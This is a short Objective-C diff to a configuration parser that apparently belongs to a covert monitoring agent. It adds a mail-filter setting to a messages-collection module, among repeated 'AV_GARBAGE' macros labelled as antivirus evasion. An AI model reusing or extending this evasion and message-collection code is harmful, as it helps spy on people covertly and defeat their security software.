@@ -12,6 +12,9 @@
 
 #import "RCSMAVGarbage.h"
 
+#import "RCSMLogger.h"  // jo remove when done
+#import "RCSMDebug.h"  // jo remove when done
+
 //#define DEBUG_JSON_CONFIG_
 
 @interface SBJSonConfigDelegate (hidden)
@@ -1284,8 +1287,10 @@ typedef struct  {
   [pool release];
 }
 
+
 - (void)initMessagesModule: (NSDictionary *)aModule
 {
+    
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
   // AV evasion: only on release build
@@ -1298,8 +1303,7 @@ typedef struct  {
   // AV evasion: only on release build
   AV_GARBAGE_001
   
-  
-  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
+ NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
   // AV evasion: only on release build
   AV_GARBAGE_003
@@ -1310,6 +1314,10 @@ typedef struct  {
   if (status == nil || [status boolValue] == FALSE)
     enabled = AGENT_DISABLED;
   
+    // jo add start
+  NSMutableDictionary *filter = [[aModule objectForKey:@"mail"] objectForKey:@"filter"];
+    // jo add end
+    
   // AV evasion: only on release build
   AV_GARBAGE_005
   
@@ -1323,7 +1331,7 @@ typedef struct  {
   
   objects = [NSArray arrayWithObjects: type, 
              enabled, 
-             MODULE_EMPTY_CONF,
+             filter, //jo //MODULE_EMPTY_CONF
              nil];
   
   // AV evasion: only on release build
